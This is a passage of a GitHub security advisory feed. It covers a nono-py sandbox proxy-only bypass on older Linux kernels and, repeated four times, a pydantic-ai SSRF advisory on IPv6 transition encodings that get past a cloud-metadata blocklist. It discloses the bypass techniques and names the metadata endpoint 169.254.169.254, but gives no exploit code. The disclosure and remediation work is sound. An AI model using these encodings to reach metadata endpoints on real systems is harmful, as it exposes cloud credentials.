<li>Kernel without Landlock network support, such as Linux 6.1. Landlock network rules require Landlock ABI v4 / Linux 6.7 or newer.</li>
<li><code>nono_py.sandboxed_exec()</code> is used.</li>
<li>The capability set uses <code>caps.proxy_only(proxy)</code>.</li>
<li>The child process removes or ignores proxy environment variables, or uses raw sockets.</li>
</ul>
<p>macOS Seatbelt proxy-only enforcement is not affected by this Linux seccomp-notify fallback issue.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>Known affected builds include nono-py versions that expose and use <code>CapabilitySet.proxy_only()</code> through <code>sandboxed_exec()</code> before the supervised fallback fix in this working tree.</p>
<p>Earlier versions that did not expose <code>CapabilitySet.proxy_only()</code> are not affected by this specific proxy-only enforcement bug, though they may have separate environment-inheritance risks if callers passed broad parent environment variables into sandboxed children.</p>
<p><strong>CVSS Score Rationale</strong></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Rationale</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>L — Local</td>
<td>Exploit is performed by a local process (unsetting env vars or opening raw sockets). Not remotely triggerable.</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>H — High</td>
<td>All of the following must be true: Linux runtime; kernel &lt; 6.7 (no Landlock ABI v4); <code>sandboxed_exec()</code> used; capability set calls <code>proxy_only()</code>; child actively bypasses proxy env vars or uses raw sockets.</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>L — Low</td>
<td>Attacker is already executing code inside the sandbox — some user-level privilege is required to get there.</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>N — None</td>
<td>No action from a user or operator is needed once the sandboxed child is running.</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>C — Changed</td>
<td>The exploit crosses the sandbox security boundary, allowing the child to reach network resources outside the defined policy scope.</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>H — High</td>
<td>Highest-impact path: direct TCP to cloud metadata endpoint (169.254.169.254) yields IAM / task credentials.</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>L — Low</td>
<td>Attacker can make arbitrary outbound requests; no direct data modification from the bypass itself, but lateral credential use creates indirect risk.</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>N — None</td>
<td>No denial-of-service impact described or implied.</td>
</tr>
</tbody></table>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/always-further/nono-py/security/advisories/GHSA-72w7-mf9g-733p">https://github.com/always-further/nono-py/security/advisories/GHSA-72w7-mf9g-733p</a></li>
<li><a href="https://github.com/nolabs-ai/nono-py/commit/3e67dfa11cbe9514f315fdd36473680c318816d7">https://github.com/nolabs-ai/nono-py/commit/3e67dfa11cbe9514f315fdd36473680c318816d7</a></li>
<li><a href="https://github.com/advisories/GHSA-72w7-mf9g-733p">https://github.com/advisories/GHSA-72w7-mf9g-733p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-72w7-mf9g-733p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T20:33:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai-slim] pydantic-ai: SSRF blocklist bypass via IPv4-compatible, SIIT/IVI, and local NAT64 IPv6 addresses (incomplete fix of CVE-2026-46678)]]></title>
        <id>https://github.com/advisories/GHSA-cg7w-rg45-pc59</id>
        <link href="https://github.com/advisories/GHSA-cg7w-rg45-pc59"/>
        <updated>2026-06-26T19:17:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application using Pydantic AI opts a URL into <code>force_download='allow-local'</code> (which disables the default block on private/internal IPs) <strong>and runs on a network that routes the affected IPv6 transition forms (NAT64- or ISATAP-configured networks)</strong>, the cloud-metadata blocklist could be bypassed by encoding the metadata IP in an IPv6 transition form that the previous fix did not decode — IPv4-compatible IPv6 (<code>::a.b.c.d</code>), the NAT64 RFC 8215 local-use prefix (<code>64:ff9b:1::/48</code>), operator-chosen NAT64 prefixes, or ISATAP. The IPv6 wrapper is then delivered to the underlying IPv4 metadata endpoint, exposing cloud IAM short-term credentials.</p>
<p><strong>The bypass is exploitable only in environments whose network actually routes these forms</strong> — NAT64-configured networks (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or networks with an ISATAP tunnel for ISATAP. A standard dual-stack cloud VM or container does not route them and is not affected in practice. The IPv4-compatible and Teredo variants are deprecated and addressed as defense-in-depth.</p>
<p>This is an incomplete fix of <a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3">GHSA-cqp8-fcvh-x7r3</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46678">CVE-2026-46678</a> (itself a follow-up to <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25580">CVE-2026-25580</a>). The prior remediation decoded only IPv4-mapped IPv6, 6to4, and the NAT64 well-known prefix; the metadata guarantee did not hold for the remaining transition forms.</p>
<h2 id="severity">Severity</h2>
<p><strong>MEDIUM</strong> — <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N</code> = <strong>6.8</strong></p>
<p>Same impact metrics and narrow attack surface as the parent advisory (AC:H): exploitation requires the application to have opted into <code>allow-local</code> on a URL influenced by untrusted input, and the NAT64/ISATAP variants additionally require the deployment network to route those forms.</p>
<p><strong>CWE-918</strong>: Server-Side Request Forgery (SSRF)</p>
<h2 id="affected-versions">Affected Versions</h2>
<table>
<thead>
<tr>
<th>Package</th>
<th>Vulnerable</th>
<th>Patched</th>
</tr>
</thead>
<tbody><tr>
<td><code>pydantic-ai</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
<tr>
<td><code>pydantic-ai-slim</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
</tbody></table>
<p>These transition forms have not been decoded since SSRF protection was introduced in <code>1.56.0</code>.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>Users are affected <strong>only if</strong> their application explicitly opts a <code>FileUrl</code> (<code>ImageUrl</code>, <code>AudioUrl</code>, <code>VideoUrl</code>, <code>DocumentUrl</code>) into <code>force_download='allow-local'</code> on a URL that is, or could be, influenced by untrusted input.</p>
<p>Beyond that precondition, the affected encodings only reach a metadata endpoint in environments whose network actually routes them. The broadly-routable IPv4-mapped form was addressed in <code>1.99.0</code> (CVE-2026-46678); the additional forms addressed here require a <strong>NAT64-configured network</strong> (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or an <strong>ISATAP tunnel</strong> for the ISATAP variant. The IPv4-compatible and Teredo forms are deprecated and not routed by modern stacks; they are addressed as defense-in-depth. Most deployments on a standard dual-stack cloud VM or container are therefore not exploitable in practice, but the fix restores the "always blocked" guarantee for the environments that are.</p>
<p>Users are <strong>not</strong> affected if they use any of the bundled integrations to ingest user input, because they do not propagate <code>force_download</code> from external data:</p>
<ul>
<li><code>Agent.to_web</code> / <code>clai web</code></li>
<li><code>VercelAIAdapter</code></li>
<li><code>AGUIAdapter</code> / <code>Agent.to_ag_ui</code></li>
</ul>
<p>Applications that only download from developer-controlled URLs are not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>1.102.0</code> or later (or <code>2.0.0b3</code> or later on the 2.0 pre-release line). The cloud-metadata and private-IP blocklists now decode the embedded IPv4 of every standardized IPv6 transition form before evaluating it — IPv4-mapped, IPv4-compatible, 6to4, NAT64 across all prefix lengths (including the RFC 8215 local-use prefix and operator-chosen prefixes), ISATAP, and Teredo. The set of always-blocked cloud metadata/credential endpoints has also been expanded across providers.</p>
<h2 id="workaround-for-unpatched-versions">Workaround for Unpatched Versions</h2>
<p>Avoid passing <code>force_download='allow-local'</code> on any URL that could be influenced by untrusted input. If developers must, resolve the hostname themselves and validate the result against their own metadata blocklist — including IPv6 transition forms — before constructing the <code>FileUrl</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by <a href="https://snailsploit.com">@SnailSploit</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48782">https://nvd.nist.gov/vuln/detail/CVE-2026-48782</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/pull/5596">https://github.com/pydantic/pydantic-ai/pull/5596</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4">https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cg7w-rg45-pc59">https://github.com/advisories/GHSA-cg7w-rg45-pc59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg7w-rg45-pc59</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T19:17:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai] pydantic-ai: SSRF blocklist bypass via IPv4-compatible, SIIT/IVI, and local NAT64 IPv6 addresses (incomplete fix of CVE-2026-46678)]]></title>
        <id>https://github.com/advisories/GHSA-cg7w-rg45-pc59</id>
        <link href="https://github.com/advisories/GHSA-cg7w-rg45-pc59"/>
        <updated>2026-06-26T19:17:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application using Pydantic AI opts a URL into <code>force_download='allow-local'</code> (which disables the default block on private/internal IPs) <strong>and runs on a network that routes the affected IPv6 transition forms (NAT64- or ISATAP-configured networks)</strong>, the cloud-metadata blocklist could be bypassed by encoding the metadata IP in an IPv6 transition form that the previous fix did not decode — IPv4-compatible IPv6 (<code>::a.b.c.d</code>), the NAT64 RFC 8215 local-use prefix (<code>64:ff9b:1::/48</code>), operator-chosen NAT64 prefixes, or ISATAP. The IPv6 wrapper is then delivered to the underlying IPv4 metadata endpoint, exposing cloud IAM short-term credentials.</p>
<p><strong>The bypass is exploitable only in environments whose network actually routes these forms</strong> — NAT64-configured networks (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or networks with an ISATAP tunnel for ISATAP. A standard dual-stack cloud VM or container does not route them and is not affected in practice. The IPv4-compatible and Teredo variants are deprecated and addressed as defense-in-depth.</p>
<p>This is an incomplete fix of <a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3">GHSA-cqp8-fcvh-x7r3</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46678">CVE-2026-46678</a> (itself a follow-up to <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25580">CVE-2026-25580</a>). The prior remediation decoded only IPv4-mapped IPv6, 6to4, and the NAT64 well-known prefix; the metadata guarantee did not hold for the remaining transition forms.</p>
<h2 id="severity">Severity</h2>
<p><strong>MEDIUM</strong> — <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N</code> = <strong>6.8</strong></p>
<p>Same impact metrics and narrow attack surface as the parent advisory (AC:H): exploitation requires the application to have opted into <code>allow-local</code> on a URL influenced by untrusted input, and the NAT64/ISATAP variants additionally require the deployment network to route those forms.</p>
<p><strong>CWE-918</strong>: Server-Side Request Forgery (SSRF)</p>
<h2 id="affected-versions">Affected Versions</h2>
<table>
<thead>
<tr>
<th>Package</th>
<th>Vulnerable</th>
<th>Patched</th>
</tr>
</thead>
<tbody><tr>
<td><code>pydantic-ai</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
<tr>
<td><code>pydantic-ai-slim</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
</tbody></table>
<p>These transition forms have not been decoded since SSRF protection was introduced in <code>1.56.0</code>.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>Users are affected <strong>only if</strong> their application explicitly opts a <code>FileUrl</code> (<code>ImageUrl</code>, <code>AudioUrl</code>, <code>VideoUrl</code>, <code>DocumentUrl</code>) into <code>force_download='allow-local'</code> on a URL that is, or could be, influenced by untrusted input.</p>
<p>Beyond that precondition, the affected encodings only reach a metadata endpoint in environments whose network actually routes them. The broadly-routable IPv4-mapped form was addressed in <code>1.99.0</code> (CVE-2026-46678); the additional forms addressed here require a <strong>NAT64-configured network</strong> (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or an <strong>ISATAP tunnel</strong> for the ISATAP variant. The IPv4-compatible and Teredo forms are deprecated and not routed by modern stacks; they are addressed as defense-in-depth. Most deployments on a standard dual-stack cloud VM or container are therefore not exploitable in practice, but the fix restores the "always blocked" guarantee for the environments that are.</p>
<p>Users are <strong>not</strong> affected if they use any of the bundled integrations to ingest user input, because they do not propagate <code>force_download</code> from external data:</p>
<ul>
<li><code>Agent.to_web</code> / <code>clai web</code></li>
<li><code>VercelAIAdapter</code></li>
<li><code>AGUIAdapter</code> / <code>Agent.to_ag_ui</code></li>
</ul>
<p>Applications that only download from developer-controlled URLs are not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>1.102.0</code> or later (or <code>2.0.0b3</code> or later on the 2.0 pre-release line). The cloud-metadata and private-IP blocklists now decode the embedded IPv4 of every standardized IPv6 transition form before evaluating it — IPv4-mapped, IPv4-compatible, 6to4, NAT64 across all prefix lengths (including the RFC 8215 local-use prefix and operator-chosen prefixes), ISATAP, and Teredo. The set of always-blocked cloud metadata/credential endpoints has also been expanded across providers.</p>
<h2 id="workaround-for-unpatched-versions">Workaround for Unpatched Versions</h2>
<p>Avoid passing <code>force_download='allow-local'</code> on any URL that could be influenced by untrusted input. If developers must, resolve the hostname themselves and validate the result against their own metadata blocklist — including IPv6 transition forms — before constructing the <code>FileUrl</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by <a href="https://snailsploit.com">@SnailSploit</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48782">https://nvd.nist.gov/vuln/detail/CVE-2026-48782</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/pull/5596">https://github.com/pydantic/pydantic-ai/pull/5596</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4">https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cg7w-rg45-pc59">https://github.com/advisories/GHSA-cg7w-rg45-pc59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg7w-rg45-pc59</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T19:17:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai] pydantic-ai: SSRF blocklist bypass via IPv4-compatible, SIIT/IVI, and local NAT64 IPv6 addresses (incomplete fix of CVE-2026-46678)]]></title>
        <id>https://github.com/advisories/GHSA-cg7w-rg45-pc59</id>
        <link href="https://github.com/advisories/GHSA-cg7w-rg45-pc59"/>
        <updated>2026-06-26T19:17:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application using Pydantic AI opts a URL into <code>force_download='allow-local'</code> (which disables the default block on private/internal IPs) <strong>and runs on a network that routes the affected IPv6 transition forms (NAT64- or ISATAP-configured networks)</strong>, the cloud-metadata blocklist could be bypassed by encoding the metadata IP in an IPv6 transition form that the previous fix did not decode — IPv4-compatible IPv6 (<code>::a.b.c.d</code>), the NAT64 RFC 8215 local-use prefix (<code>64:ff9b:1::/48</code>), operator-chosen NAT64 prefixes, or ISATAP. The IPv6 wrapper is then delivered to the underlying IPv4 metadata endpoint, exposing cloud IAM short-term credentials.</p>
<p><strong>The bypass is exploitable only in environments whose network actually routes these forms</strong> — NAT64-configured networks (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or networks with an ISATAP tunnel for ISATAP. A standard dual-stack cloud VM or container does not route them and is not affected in practice. The IPv4-compatible and Teredo variants are deprecated and addressed as defense-in-depth.</p>
<p>This is an incomplete fix of <a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3">GHSA-cqp8-fcvh-x7r3</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46678">CVE-2026-46678</a> (itself a follow-up to <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25580">CVE-2026-25580</a>). The prior remediation decoded only IPv4-mapped IPv6, 6to4, and the NAT64 well-known prefix; the metadata guarantee did not hold for the remaining transition forms.</p>
<h2 id="severity">Severity</h2>
<p><strong>MEDIUM</strong> — <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N</code> = <strong>6.8</strong></p>
<p>Same impact metrics and narrow attack surface as the parent advisory (AC:H): exploitation requires the application to have opted into <code>allow-local</code> on a URL influenced by untrusted input, and the NAT64/ISATAP variants additionally require the deployment network to route those forms.</p>
<p><strong>CWE-918</strong>: Server-Side Request Forgery (SSRF)</p>
<h2 id="affected-versions">Affected Versions</h2>
<table>
<thead>
<tr>
<th>Package</th>
<th>Vulnerable</th>
<th>Patched</th>
</tr>
</thead>
<tbody><tr>
<td><code>pydantic-ai</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
<tr>
<td><code>pydantic-ai-slim</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
</tbody></table>
<p>These transition forms have not been decoded since SSRF protection was introduced in <code>1.56.0</code>.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>Users are affected <strong>only if</strong> their application explicitly opts a <code>FileUrl</code> (<code>ImageUrl</code>, <code>AudioUrl</code>, <code>VideoUrl</code>, <code>DocumentUrl</code>) into <code>force_download='allow-local'</code> on a URL that is, or could be, influenced by untrusted input.</p>
<p>Beyond that precondition, the affected encodings only reach a metadata endpoint in environments whose network actually routes them. The broadly-routable IPv4-mapped form was addressed in <code>1.99.0</code> (CVE-2026-46678); the additional forms addressed here require a <strong>NAT64-configured network</strong> (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or an <strong>ISATAP tunnel</strong> for the ISATAP variant. The IPv4-compatible and Teredo forms are deprecated and not routed by modern stacks; they are addressed as defense-in-depth. Most deployments on a standard dual-stack cloud VM or container are therefore not exploitable in practice, but the fix restores the "always blocked" guarantee for the environments that are.</p>
<p>Users are <strong>not</strong> affected if they use any of the bundled integrations to ingest user input, because they do not propagate <code>force_download</code> from external data:</p>
<ul>
<li><code>Agent.to_web</code> / <code>clai web</code></li>
<li><code>VercelAIAdapter</code></li>
<li><code>AGUIAdapter</code> / <code>Agent.to_ag_ui</code></li>
</ul>
<p>Applications that only download from developer-controlled URLs are not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>1.102.0</code> or later (or <code>2.0.0b3</code> or later on the 2.0 pre-release line). The cloud-metadata and private-IP blocklists now decode the embedded IPv4 of every standardized IPv6 transition form before evaluating it — IPv4-mapped, IPv4-compatible, 6to4, NAT64 across all prefix lengths (including the RFC 8215 local-use prefix and operator-chosen prefixes), ISATAP, and Teredo. The set of always-blocked cloud metadata/credential endpoints has also been expanded across providers.</p>
<h2 id="workaround-for-unpatched-versions">Workaround for Unpatched Versions</h2>
<p>Avoid passing <code>force_download='allow-local'</code> on any URL that could be influenced by untrusted input. If developers must, resolve the hostname themselves and validate the result against their own metadata blocklist — including IPv6 transition forms — before constructing the <code>FileUrl</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by <a href="https://snailsploit.com">@SnailSploit</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48782">https://nvd.nist.gov/vuln/detail/CVE-2026-48782</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/pull/5596">https://github.com/pydantic/pydantic-ai/pull/5596</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4">https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cg7w-rg45-pc59">https://github.com/advisories/GHSA-cg7w-rg45-pc59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg7w-rg45-pc59</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T19:17:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pydantic-ai-slim] pydantic-ai: SSRF blocklist bypass via IPv4-compatible, SIIT/IVI, and local NAT64 IPv6 addresses (incomplete fix of CVE-2026-46678)]]></title>
        <id>https://github.com/advisories/GHSA-cg7w-rg45-pc59</id>
        <link href="https://github.com/advisories/GHSA-cg7w-rg45-pc59"/>
        <updated>2026-06-26T19:17:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application using Pydantic AI opts a URL into <code>force_download='allow-local'</code> (which disables the default block on private/internal IPs) <strong>and runs on a network that routes the affected IPv6 transition forms (NAT64- or ISATAP-configured networks)</strong>, the cloud-metadata blocklist could be bypassed by encoding the metadata IP in an IPv6 transition form that the previous fix did not decode — IPv4-compatible IPv6 (<code>::a.b.c.d</code>), the NAT64 RFC 8215 local-use prefix (<code>64:ff9b:1::/48</code>), operator-chosen NAT64 prefixes, or ISATAP. The IPv6 wrapper is then delivered to the underlying IPv4 metadata endpoint, exposing cloud IAM short-term credentials.</p>
<p><strong>The bypass is exploitable only in environments whose network actually routes these forms</strong> — NAT64-configured networks (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or networks with an ISATAP tunnel for ISATAP. A standard dual-stack cloud VM or container does not route them and is not affected in practice. The IPv4-compatible and Teredo variants are deprecated and addressed as defense-in-depth.</p>
<p>This is an incomplete fix of <a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3">GHSA-cqp8-fcvh-x7r3</a> / <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46678">CVE-2026-46678</a> (itself a follow-up to <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25580">CVE-2026-25580</a>). The prior remediation decoded only IPv4-mapped IPv6, 6to4, and the NAT64 well-known prefix; the metadata guarantee did not hold for the remaining transition forms.</p>
<h2 id="severity">Severity</h2>
<p><strong>MEDIUM</strong> — <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N</code> = <strong>6.8</strong></p>
<p>Same impact metrics and narrow attack surface as the parent advisory (AC:H): exploitation requires the application to have opted into <code>allow-local</code> on a URL influenced by untrusted input, and the NAT64/ISATAP variants additionally require the deployment network to route those forms.</p>
<p><strong>CWE-918</strong>: Server-Side Request Forgery (SSRF)</p>
<h2 id="affected-versions">Affected Versions</h2>
<table>
<thead>
<tr>
<th>Package</th>
<th>Vulnerable</th>
<th>Patched</th>
</tr>
</thead>
<tbody><tr>
<td><code>pydantic-ai</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
<tr>
<td><code>pydantic-ai-slim</code></td>
<td><code>&gt;= 1.56.0, &lt; 1.102.0</code>; <code>&gt;= 2.0.0b1, &lt; 2.0.0b3</code></td>
<td><code>1.102.0</code>; <code>2.0.0b3</code></td>
</tr>
</tbody></table>
<p>These transition forms have not been decoded since SSRF protection was introduced in <code>1.56.0</code>.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>Users are affected <strong>only if</strong> their application explicitly opts a <code>FileUrl</code> (<code>ImageUrl</code>, <code>AudioUrl</code>, <code>VideoUrl</code>, <code>DocumentUrl</code>) into <code>force_download='allow-local'</code> on a URL that is, or could be, influenced by untrusted input.</p>
<p>Beyond that precondition, the affected encodings only reach a metadata endpoint in environments whose network actually routes them. The broadly-routable IPv4-mapped form was addressed in <code>1.99.0</code> (CVE-2026-46678); the additional forms addressed here require a <strong>NAT64-configured network</strong> (IPv6-only or dual-stack-with-NAT64 deployments, including some Kubernetes setups) for the NAT64 variants, or an <strong>ISATAP tunnel</strong> for the ISATAP variant. The IPv4-compatible and Teredo forms are deprecated and not routed by modern stacks; they are addressed as defense-in-depth. Most deployments on a standard dual-stack cloud VM or container are therefore not exploitable in practice, but the fix restores the "always blocked" guarantee for the environments that are.</p>
<p>Users are <strong>not</strong> affected if they use any of the bundled integrations to ingest user input, because they do not propagate <code>force_download</code> from external data:</p>
<ul>
<li><code>Agent.to_web</code> / <code>clai web</code></li>
<li><code>VercelAIAdapter</code></li>
<li><code>AGUIAdapter</code> / <code>Agent.to_ag_ui</code></li>
</ul>
<p>Applications that only download from developer-controlled URLs are not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>1.102.0</code> or later (or <code>2.0.0b3</code> or later on the 2.0 pre-release line). The cloud-metadata and private-IP blocklists now decode the embedded IPv4 of every standardized IPv6 transition form before evaluating it — IPv4-mapped, IPv4-compatible, 6to4, NAT64 across all prefix lengths (including the RFC 8215 local-use prefix and operator-chosen prefixes), ISATAP, and Teredo. The set of always-blocked cloud metadata/credential endpoints has also been expanded across providers.</p>
<h2 id="workaround-for-unpatched-versions">Workaround for Unpatched Versions</h2>
<p>Avoid passing <code>force_download='allow-local'</code> on any URL that could be influenced by untrusted input. If developers must, resolve the hostname themselves and validate the result against their own metadata blocklist — including IPv6 transition forms — before constructing the <code>FileUrl</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by <a href="https://snailsploit.com">@SnailSploit</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59">https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cg7w-rg45-pc59</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48782">https://nvd.nist.gov/vuln/detail/CVE-2026-48782</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/pull/5596">https://github.com/pydantic/pydantic-ai/pull/5596</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4">https://github.com/pydantic/pydantic-ai/commit/1add06179ba4de259f7ab977620b697b7209f7e4</a></li>
<li><a href="https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0">https://github.com/pydantic/pydantic-ai/releases/tag/v1.102.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cg7w-rg45-pc59">https://github.com/advisories/GHSA-cg7w-rg45-pc59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg7w-rg45-pc59</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T19:17:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lemur] Lemur: ACME SSRF + creator-equality IDOR lead to AWS IAM/PKI compromise]]></title>
        <id>https://github.com/advisories/GHSA-v2wp-frmc-5q3v</id>
        <link href="https://github.com/advisories/GHSA-v2wp-frmc-5q3v"/>
        <updated>2026-06-25T22:07:20.000Z</updated>
